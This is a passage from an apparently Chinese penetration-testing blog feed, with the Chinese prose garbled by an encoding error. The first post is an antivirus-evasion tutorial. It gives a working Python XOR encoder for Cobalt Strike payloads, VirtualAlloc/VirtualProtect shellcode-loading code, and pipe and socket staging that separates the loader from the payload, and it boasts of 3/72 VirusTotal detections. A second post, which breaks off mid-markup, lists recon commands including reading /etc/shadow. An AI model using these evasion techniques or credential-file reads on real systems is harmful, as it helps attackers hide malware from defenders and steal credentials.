class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> argparse <span class="hljs-keyword">import</span> ArgumentParser, FileType<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">process_bin</span>(<span class="hljs-params">num, src_fp, dst_fp, dst_raw</span>):</span><br>    shellcode = <span class="hljs-string">&#x27;&#x27;</span><br>    shellcode_size = <span class="hljs-number">0</span><br>    shellcode_raw = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            code = src_fp.read(<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> code:<br>                <span class="hljs-keyword">break</span><br><br>            base10 = <span class="hljs-built_in">ord</span>(code) ^ num<br>            base10_str = <span class="hljs-built_in">chr</span>(base10)<br>            shellcode_raw += base10_str.encode()<br>            code_hex = <span class="hljs-built_in">hex</span>(base10)<br>            code_hex = code_hex.replace(<span class="hljs-string">&#x27;0x&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>            <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(code_hex) == <span class="hljs-number">1</span>):<br>                code_hex = <span class="hljs-string">&#x27;0&#x27;</span> + code_hex<br>            shellcode += <span class="hljs-string">&#x27;\\x&#x27;</span> + code_hex<br>            shellcode_size += <span class="hljs-number">1</span><br>        src_fp.close()<br>        dst_raw.write(shellcode_raw)<br>        dst_raw.close()<br>        dst_fp.write(shellcode)<br>        dst_fp.close()<br>        <span class="hljs-keyword">return</span> shellcode_size<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        sys.stderr.writelines(<span class="hljs-built_in">str</span>(e))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    parser = ArgumentParser(prog=<span class="hljs-string">&#x27;Shellcode X&#x27;</span>, description=<span class="hljs-string">&#x27;[XOR The Cobaltstrike PAYLOAD.BINs] \t &gt; Author: rvn0xsy@gmail.com&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-v&#x27;</span>,<span class="hljs-string">&#x27;--version&#x27;</span>,nargs=<span class="hljs-string">&#x27;?&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-s&#x27;</span>,<span class="hljs-string">&#x27;--src&#x27;</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">u&#x27;source bin file&#x27;</span>,<span class="hljs-built_in">type</span>=FileType(<span class="hljs-string">&#x27;rb&#x27;</span>), required=<span class="hljs-literal">True</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-d&#x27;</span>,<span class="hljs-string">&#x27;--dst&#x27;</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">u&#x27;destination shellcode file&#x27;</span>,<span class="hljs-built_in">type</span>=FileType(<span class="hljs-string">&#x27;w+&#x27;</span>),required=<span class="hljs-literal">True</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-n&#x27;</span>,<span class="hljs-string">&#x27;--num&#x27;</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">u&#x27;Confused number&#x27;</span>,<span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>, default=<span class="hljs-number">90</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-r&#x27;</span>,<span class="hljs-string">&#x27;--raw&#x27;</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">u&#x27;output bin file&#x27;</span>, <span class="hljs-built_in">type</span>=FileType(<span class="hljs-string">&#x27;wb&#x27;</span>), required=<span class="hljs-literal">True</span>)<br>    args = parser.parse_args()<br>    shellcode_size = process_bin(args.num, args.src, args.dst, args.raw)<br>    sys.stdout.writelines(<span class="hljs-string">&quot;[+]Shellcode Size : &#123;&#125; \n&quot;</span>.<span class="hljs-built_in">format</span>(shellcode_size))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p><code>python3 .\xor_shellcoder.py -s .\payload.bin  -d payload.c -n 10 -r out.bin</code></p><h3 id="å†…å­˜æ··æ·†åŠ è½½"><a href="#å†…å­˜æ··æ·†åŠ è½½" class="headerlink" title="å†…å­˜æ··æ·†åŠ è½½"></a>å†…å­˜æ··æ·†åŠ è½½</h3><p>Windowsæ“ä½œç³»ç»Ÿçš„å†…å­˜æœ‰ä¸‰ç§å±æ€§ï¼Œåˆ†åˆ«ä¸ºï¼šå¯è¯»ã€å¯å†™ã€å¯æ‰§è¡Œï¼Œå¹¶ä¸”æ“ä½œç³»ç»Ÿå°†æ¯ä¸ªè¿›ç¨‹çš„å†…å­˜éƒ½éš”ç¦»å¼€æ¥ï¼Œå½“è¿›ç¨‹è¿è¡Œæ—¶ï¼Œåˆ›å»ºä¸€ä¸ªè™šæ‹Ÿçš„å†…å­˜ç©ºé—´ï¼Œç³»ç»Ÿçš„å†…å­˜ç®¡ç†å™¨å°†è™šæ‹Ÿå†…å­˜ç©ºé—´æ˜ å°„åˆ°ç‰©ç†å†…å­˜ä¸Šï¼Œæ‰€ä»¥æ¯ä¸ªè¿›ç¨‹çš„å†…å­˜éƒ½æ˜¯ç­‰å¤§çš„ã€‚<br>è€Œåœ¨è¿›ç¨‹ç”³è¯·æ—¶ï¼Œéœ€è¦å£°æ˜è¿™å—å†…å­˜çš„åŸºæœ¬ä¿¡æ¯ï¼šç”³è¯·å†…å­˜å¤§å°ã€ç”³è¯·å†…å­˜èµ·å§‹å†…å­˜åŸºå€ã€ç”³è¯·å†…å­˜å±æ€§ã€ç”³è¯·å†…å­˜å¯¹å¤–çš„æƒé™ç­‰ã€‚<br>ç”³è¯·æ–¹å¼æœ‰æˆ‘ä»¬æ¯”è¾ƒç†Ÿæ‚‰çš„<code>malloc,new</code>,è€Œåç»­æˆ‘ä»¬å¯èƒ½ç”¨åˆ°æ›´å¤šçš„æ˜¯<code>VirtualAlloc</code>ï¼Œå…¶ç”³è¯·å†…å­˜çš„å•ä½ä¸ºâ€é¡µâ€</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">char</span> * shellcode = (<span class="hljs-keyword">char</span> *)VirtualAlloc(<br>    <span class="hljs-literal">NULL</span>,<span class="hljs-comment">//åŸºå€</span><br>    shellcode_size,<span class="hljs-comment">//å¤§å°</span><br>    MEM_COMMIT,<span class="hljs-comment">//å†…å­˜é¡µçŠ¶æ€,ç”³è¯·æ–°çš„å†…å­˜ï¼Œä¿ç•™åŸæ¥çš„å—(åªèƒ½åœ¨åŸæ¥çš„å—ä¸Šæäº¤)</span><br>    PAGE_EXECUTE_READWRITE<span class="hljs-comment">//å¯è¯»å¯å†™å¯æ‰§è¡Œ</span><br>    );<br>    <span class="hljs-comment">// å°†shellcodeå¤åˆ¶åˆ°å¯æ‰§è¡Œçš„å†…å­˜é¡µä¸­</span><br>CopyMemory(shellcode,buf,shellcode_size);<br></code></pre></td></tr></table></figure><h3 id="ä¼˜åŒ–å†…å­˜ç”³è¯·"><a href="#ä¼˜åŒ–å†…å­˜ç”³è¯·" class="headerlink" title="ä¼˜åŒ–å†…å­˜ç”³è¯·"></a>ä¼˜åŒ–å†…å­˜ç”³è¯·</h3><p>åœ¨ç”³è¯·å†…å­˜é¡µæ—¶ï¼Œå°†å…¶æƒé™æ›´æ”¹ï¼Œå› ä¸ºç›´æ¥èµ‹äºˆä¸€ä¸ªæ–°å†…å­˜å¯è¯»å¯å†™å¯æ‰§è¡Œæ—¶çš„æƒé™æ—¶ï¼Œå¾ˆå®¹æ˜“è¢«æ€è½¯æŸ¥æ€ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨Shellcodeè¯»å…¥æ—¶ï¼Œç”³è¯·ä¸€ä¸ªæ™®é€šçš„å¯è¯»å†™çš„å†…å­˜é¡µï¼Œç„¶åå†é€šè¿‡VirtualProtectæ”¹å˜å®ƒçš„å±æ€§ -&gt; å¯æ‰§è¡Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">char</span> * shellcode = (<span class="hljs-keyword">char</span> *)VirtualAlloc(<br>    <span class="hljs-literal">NULL</span>,<br>    shellcode_size,<br>    MEM_COMMIT,<br>    PAGE_READWRITE <span class="hljs-comment">// åªç”³è¯·å¯è¯»å¯å†™</span><br>    );<br><br>    <span class="hljs-comment">// å°†shellcodeå¤åˆ¶åˆ°å¯è¯»å¯å†™çš„å†…å­˜é¡µä¸­</span><br>CopyMemory(shellcode,buf,shellcode_size);<br><br><span class="hljs-comment">// è¿™é‡Œå¼€å§‹æ›´æ”¹å®ƒçš„å±æ€§ä¸ºå¯æ‰§è¡Œ</span><br>VirtualProtect(shellcode,shellcode_size,PAGE_EXECUTE,&amp;dwOldProtect);<br></code></pre></td></tr></table></figure><h3 id="ä¼˜åŒ–æ··æ·†"><a href="#ä¼˜åŒ–æ··æ·†" class="headerlink" title="ä¼˜åŒ–æ··æ·†"></a>ä¼˜åŒ–æ··æ·†</h3><p>æˆ‘ä»¬ä¹‹å‰åœ¨æ··æ·†Shellcodeæ—¶ï¼Œç”¨åˆ°çš„æ˜¯å¼‚æˆ–è¿ç®—ï¼Œå¸¸å¸¸æ€è½¯ä¼šå¯¹è¿™ç§å¼‚æˆ–æ“ä½œæ¯”è¾ƒæ•æ„Ÿï¼Œè€Œåœ¨windowsæ ¸å¿ƒç¼–ç¨‹ä¸­ï¼Œæœ‰ç›¸åº”çš„APIå¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œæœ‰<code>InterlockedXorRelease</code>è¯¥å‡½æ•°ï¼Œå¯ä»¥ç›´æ¥ç”¨äºä¸¤ä¸ªå€¼çš„å¼‚æˆ–è¿ç®—</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;i&lt;shellcode_size; i++)&#123;<br>    _InterlockedXor8(buf+i,<span class="hljs-number">10</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="åˆ†ç¦»å…æ€ä¸ç®¡é“é€šä¿¡"><a href="#åˆ†ç¦»å…æ€ä¸ç®¡é“é€šä¿¡" class="headerlink" title="åˆ†ç¦»å…æ€ä¸ç®¡é“é€šä¿¡"></a>åˆ†ç¦»å…æ€ä¸ç®¡é“é€šä¿¡</h3><p>åˆ†ç¦»å…æ€æŒ‡çš„æ˜¯å°†æ¶æ„ä»£ç æ”¾ç½®åœ¨ç¨‹åºæœ¬èº«ä¹‹å¤–çš„ä¸€ç§åŠ è½½æ–¹å¼ï¼Œè¿™ä¸ªå¾ˆå¥½ç†è§£ï¼Œä¸»è¦æ˜¯ç®¡é“é€šä¿¡ï¼Œç®€å•çš„è§£é‡Šæ˜¯ï¼šé€šè¿‡ç½‘ç»œæ¥å®Œæˆè¿›ç¨‹é—´çš„é€šä¿¡ï¼Œå®ƒå±è”½äº†åº•å±‚çš„ç½‘ç»œåè®®ç»†èŠ‚<br>ä½†è¿™ä¹ˆè§£é‡Šè¿˜æ˜¯æ¯”è¾ƒæŠ½è±¡<br>é¦–å…ˆæˆ‘ä»¬å…ˆè€ƒè™‘è¿›ç¨‹é€šä¿¡çš„ç›®çš„</p><ul><li>æ•°æ®ä¼ è¾“ï¼šä¸€ä¸ªè¿›ç¨‹éœ€è¦å°†å®ƒçš„æ•°æ®å‘é€ç»™å¦ä¸€ä¸ªè¿›ç¨‹</li><li>èµ„æºå…±äº«ï¼šå¤šä¸ªè¿›ç¨‹ä¹‹é—´å…±äº«åŒæ ·çš„èµ„æºã€‚</li><li>é€šçŸ¥äº‹ä»¶ï¼šä¸€ä¸ªè¿›ç¨‹éœ€è¦å‘å¦ä¸€ä¸ªæˆ–ä¸€ç»„è¿›ç¨‹å‘é€æ¶ˆæ¯ï¼Œé€šçŸ¥å®ƒï¼ˆå®ƒä»¬ï¼‰å‘ç”Ÿäº†æŸç§äº‹ä»¶ï¼ˆå¦‚è¿›ç¨‹ç»ˆæ­¢æ—¶è¦é€šçŸ¥çˆ¶è¿›ç¨‹ï¼‰ã€‚</li><li>è¿›ç¨‹æ§åˆ¶ï¼šæœ‰äº›è¿›ç¨‹å¸Œæœ›å®Œå…¨æ§åˆ¶å¦ä¸€ä¸ªè¿›ç¨‹çš„æ‰§è¡Œï¼ˆå¦‚Debugè¿›ç¨‹ï¼‰ï¼Œæ­¤æ—¶æ§åˆ¶è¿›ç¨‹å¸Œæœ›èƒ½å¤Ÿæ‹¦æˆªå¦ä¸€ä¸ªè¿›ç¨‹çš„æ‰€æœ‰é™·å…¥å’Œå¼‚å¸¸ï¼Œå¹¶èƒ½å¤ŸåŠæ—¶çŸ¥é“å®ƒçš„çŠ¶æ€æ”¹å˜ã€‚</li></ul><p>è€Œç®¡é“åˆ™æ˜¯ç®¡é“æ˜¯Unixä¸­æœ€å¤è€çš„è¿›ç¨‹é—´é€šä¿¡çš„å½¢å¼ï¼Œæˆ‘ä»¬æŠŠä»ä¸€ä¸ªè¿›ç¨‹è¿æ¥åˆ°å¦ä¸€ä¸ªè¿›ç¨‹çš„ä¸€ä¸ªæ•°æ®æµç§°ä¸ºä¸€ä¸ªâ€œç®¡é“ â€</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-comment">//åŠŸèƒ½:åˆ›å»ºä¸€ä¸ªæ— åç®¡é“</span><br><span class="hljs-comment">//å‡½æ•°åŸå‹</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">pipe</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd[<span class="hljs-number">2</span>])</span></span>;<br><span class="hljs-comment">//å‚æ•°</span><br><span class="hljs-comment">//fdï¼šæ–‡ä»¶æè¿°ç¬¦æ•°ç»„,å…¶ä¸­fd[0]è¡¨ç¤ºè¯»ç«¯, fd[1]è¡¨ç¤ºå†™ç«¯</span><br><span class="hljs-comment">//è¿”å›å€¼:æˆåŠŸè¿”å›0ï¼Œå¤±è´¥è¿”å›-1</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/10/17/fhkzOLd82j46Nlp.png" alt="ç®¡é“é€šä¿¡"></p><p>å› æ­¤ï¼Œæˆ‘ä»¬å°è¯•ä½¿ç”¨ç®¡é“é€šä¿¡ï¼Œæˆ‘ä»¬çš„ç›®çš„ä¸»è¦æ˜¯é€šè¿‡ä¸€ä¸ªçº¿ç¨‹å‡½æ•°å……å½“ä¸€ä¸ªç®¡é“å®¢æˆ·ç«¯ï¼Œä½¿ç”¨ç®¡é“å®¢æˆ·ç«¯è¿æ¥ç®¡é“ï¼Œå‘é€Shellcodeï¼Œç„¶åç”±ç®¡é“æœåŠ¡ç«¯æ¥æ”¶ï¼Œå¹¶åæ··æ·†ï¼Œè¿è¡Œæœ¨é©¬çº¿ç¨‹ï¼Œä¸‹é¢åˆ†åˆ«ä¸ºæœåŠ¡ç«¯ä¸å®¢æˆ·ç«¯ï¼Œç®¡é“é€šä¿¡æ ¸å¿ƒä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">recv</span><span class="hljs-params">()</span></span>&#123;<br>HANDLE hPipeClient;<br>    DWORD dwWritten;<br>    DWORD dwShellcodeSize = <span class="hljs-keyword">sizeof</span>(buf);<br>    <span class="hljs-comment">// ç­‰å¾…ç®¡é“å¯ç”¨</span><br>    WaitNamedPipe(ptsPipeName,NMPWAIT_WAIT_FOREVER);<br>    <span class="hljs-comment">// è¿æ¥ç®¡é“</span><br>    hPipeClient = CreateFile(ptsPipeName,GENERIC_WRITE,FILE_SHARE_READ,<span class="hljs-literal">NULL</span>,OPEN_EXISTING ,FILE_ATTRIBUTE_NORMAL,<span class="hljs-literal">NULL</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">hPipe = CreateNamedPipe(<br>        ptsPipeName,<br>        PIPE_ACCESS_INBOUND,<br>        PIPE_TYPE_BYTE| PIPE_WAIT,<br>        PIPE_UNLIMITED_INSTANCES,<br>        BUFF_SIZE,<br>        BUFF_SIZE,<br>        <span class="hljs-number">0</span>,<br>        <span class="hljs-literal">NULL</span>);<br></code></pre></td></tr></table></figure><h3 id="ä¼˜åŒ–ç®¡é“é€šä¿¡"><a href="#ä¼˜åŒ–ç®¡é“é€šä¿¡" class="headerlink" title="ä¼˜åŒ–ç®¡é“é€šä¿¡"></a>ä¼˜åŒ–ç®¡é“é€šä¿¡</h3><p>åœ¨ä¸€ä¸ªç¨‹åºé‡ŒåŒæ—¶å¯åŠ¨ä¸¤ä¸ªç®¡é“é€šä¿¡ç«¯å£è¿›è¡Œä¼ è¾“ï¼Œè¿˜æ˜¯å¾ˆå®¹æ˜“è¢«æŸ¥æ€ï¼Œä¸‹é¢å°è¯•ç”¨ç½‘ç»œå¥—æ¥å­—ï¼ˆSOCKETï¼‰æ¥è¿›è¡Œé€šä¿¡ï¼Œå°†ä¸¤ä¸ªç®¡é“é€šä¿¡ç«¯åˆ†å¼€ç¼–è¯‘<br>æœåŠ¡ç«¯æ ¸å¿ƒä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">WORD sockVersion = MAKEWORD(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>);<br>WSADATA wsaData;<br>SOCKET socks;<br>SOCKET sClient;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">s_client</span>;</span><br>INT nAddrLen = <span class="hljs-keyword">sizeof</span>(s_client);<br>SHORT sListenPort = <span class="hljs-number">8888</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">sin</span>;</span><br></code></pre></td></tr></table></figure><p>å®¢æˆ·ç«¯æ ¸å¿ƒä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">WORD sockVersion = MAKEWORD(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>);<br>WSADATA wsaData;<br>SOCKET socks;<br>SHORT sListenPort = <span class="hljs-number">8888</span>;<br><span class="hljs-built_in">sin</span>.sin_family = AF_INET;<br><span class="hljs-built_in">sin</span>.sin_port = htons(sListenPort);<br><span class="hljs-built_in">sin</span>.sin_addr.S_un.S_addr = inet_addr(<span class="hljs-string">&quot;192.168.170.1&quot;</span>);<br></code></pre></td></tr></table></figure><p>åœ¨åˆ©ç”¨ç½‘ç»œå¥—æ¥å­—çš„ç®¡é“é€šä¿¡ä¸‹åˆ†å¼€ç¼–è¯‘ï¼Œæ­¤æ—¶çš„å…æ€æ•ˆæœå·²ç»ååˆ†æ˜¾è‘—äº†ï¼Œ3/72<br><img src="https://s2.loli.net/2022/10/17/bXyrWgxY1jzoIJG.png" alt="virustotal"></p>]]></content>
      
      
      <categories>
          
          <category> å…æ€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å…æ€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å†…ç½‘æ¸—é€_ä¿¡æ¯æ”¶é›†</title>
      <link href="2022/10/09/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F_%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>2022/10/09/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F_%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="å†…ç½‘æ¸—é€"><a href="#å†…ç½‘æ¸—é€" class="headerlink" title="å†…ç½‘æ¸—é€"></a>å†…ç½‘æ¸—é€</h1><p>å¯¹äºå†…ç½‘æ¸—é€å­¦ä¹ çš„ç¬”è®°è®°å½•</p><a id="more"></a><h2 id="å†…ç½‘ç»„æˆ"><a href="#å†…ç½‘ç»„æˆ" class="headerlink" title="å†…ç½‘ç»„æˆ"></a>å†…ç½‘ç»„æˆ</h2><ul><li>å®¹å™¨</li><li>äº‘æœåŠ¡</li><li>è·¯ç”±å™¨</li><li>æœåŠ¡å™¨</li><li>æ‰“å°æœº</li><li>äº¤æ¢æœº</li><li>k8sé›†ç¾¤</li><li>Openstack</li><li>Linuxç³»ç»Ÿ</li><li>MacOSç³»ç»Ÿ</li><li>Windowsç³»ç»Ÿ</li><li>Windows ADåŸŸ</li></ul><h2 id="å†…ç½‘æ¸—é€æ€è·¯"><a href="#å†…ç½‘æ¸—é€æ€è·¯" class="headerlink" title="å†…ç½‘æ¸—é€æ€è·¯"></a>å†…ç½‘æ¸—é€æ€è·¯</h2><ul><li>å…¬ç½‘-&gt;å†…ç½‘</li><li>ä¿¡æ¯æœé›†</li><li>æ¼æ´æ‰«æ</li><li>æ¼æ´æŒ–æ˜</li><li>æ¼æ´åˆ©ç”¨</li><li>å¼€å§‹æ”»å‡»</li><li>æƒé™ç»´æŒ</li><li>æŒ ä¹… åŒ–</li><li>æƒé™æå‡</li><li>å…æ€éšè—</li><li>æ¨ªå‘ç§»åŠ¨</li><li>ç—•è¿¹æ¸…ç†</li></ul><h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h4 id="ç”¨æˆ·ä¿¡æ¯"><a href="#ç”¨æˆ·ä¿¡æ¯" class="headerlink" title="ç”¨æˆ·ä¿¡æ¯"></a>ç”¨æˆ·ä¿¡æ¯</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">whoami<br>who/w<br>id<br>finger<br>cat <span class="hljs-regexp">/etc/</span>passwd<br>cat <span class="hljs-regexp">/etc/</span>shadow<br>cat <span class="hljs-regexp">/etc/g</span>shadow<br>cat <span class="hljs-regexp">/etc/g</span>roup<br></code></pre></td></tr></table></figure><h4 id="è¿›ç¨‹ä¿¡æ¯"><a href="#è¿›ç¨‹ä¿¡æ¯" class="headerlink" title="è¿›ç¨‹ä¿¡æ¯"></a>è¿›ç¨‹ä¿¡æ¯</h4><ol><li>è¿›ç¨‹ä¿¡æ¯<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">ps</span> aux<br><span class="hljs-built_in">ps</span> <span class="hljs-literal">-efl</span><br>top<br>pstree <span class="hljs-literal">-aup</span><br></code></pre></td></tr></table></figure></li><li>ç«¯å£è¿›ç¨‹<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> lsof -i:<span class="hljs-number">22</span><br><span class="hljs-attribute">sudo</span> netstat -tunlp | grep <span class="hljs-number">53</span><br></code></pre></td></tr></table></figure></li><li>å…³é—­è¿›ç¨‹<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">kill</span> -<span class="hljs-number">9</span> PID<br></code></pre></td></tr></table></figure><h4 id="ç³»ç»Ÿä¿¡æ¯"><a href="#ç³»ç»Ÿä¿¡æ¯" class="headerlink" title="ç³»ç»Ÿä¿¡æ¯"></a>ç³»ç»Ÿä¿¡æ¯</h4></li><li>ä¸»æœºåç§°<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">uname -a</span><br></code></pre></td></tr></table></figure></li><li>å†…æ ¸ç‰ˆæœ¬<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gradle">uname -srm<br>hostnamectl<br>hostnamectl | <span class="hljs-keyword">grep</span> -i kernel<br>cat <span class="hljs-regexp">/proc/</span>version<br></code></pre></td></tr></table></figure></li><li>CPUä¿¡æ¯<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">lscpu<br>cat <span class="hljs-regexp">/proc/</span>cpuinfo<br></code></pre></td></tr></table></figure></li><li>å†…å­˜ä¿¡æ¯<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">free -m -w<br>cat <span class="hljs-regexp">/proc/m</span>eminfo <br></code></pre></td></tr></table></figure></li><li>äº¤æ¢åˆ†åŒº<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">free -m -w<br>cat <span class="hljs-regexp">/proc/m</span>eminfo <br></code></pre></td></tr></table></figure></li><li>ç¯å¢ƒå˜é‡<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">set</span><br></code></pre></td></tr></table></figure><h4 id="å¯åŠ¨ä¿¡æ¯"><a href="#å¯åŠ¨ä¿¡æ¯" class="headerlink" title="å¯åŠ¨ä¿¡æ¯"></a>å¯åŠ¨ä¿¡æ¯</h4></li></ol><h4 id="è®¡åˆ’ä»»åŠ¡"><a href="#è®¡åˆ’ä»»åŠ¡" class="headerlink" title="è®¡åˆ’ä»»åŠ¡"></a>è®¡åˆ’ä»»åŠ¡</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">schtasks</span><br></code></pre></td></tr></table></figure><h4 id="å¯†ç ä¿¡æ¯"><a href="#å¯†ç ä¿¡æ¯" class="headerlink" title="å¯†ç ä¿¡æ¯"></a>å¯†ç ä¿¡æ¯</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/etc/</span>password<br>cat <span class="hljs-regexp">/etc/</span>shadow<br></code></pre></td></tr></table></figure><h4 id="ç¥¨æ®ä¿¡æ¯"><a href="#ç¥¨æ®ä¿¡æ¯" class="headerlink" title="ç¥¨æ®ä¿¡æ¯"></a>ç¥¨æ®ä¿¡æ¯</h4><h4 id="ç£ç›˜ä¿¡æ¯"><a href="#ç£ç›˜ä¿¡æ¯" class="headerlink" title="ç£ç›˜ä¿¡æ¯"></a>ç£ç›˜ä¿¡æ¯</h4><h4 id="ç½‘ç»œä¿¡æ¯"><a href="#ç½‘ç»œä¿¡æ¯" class="headerlink" 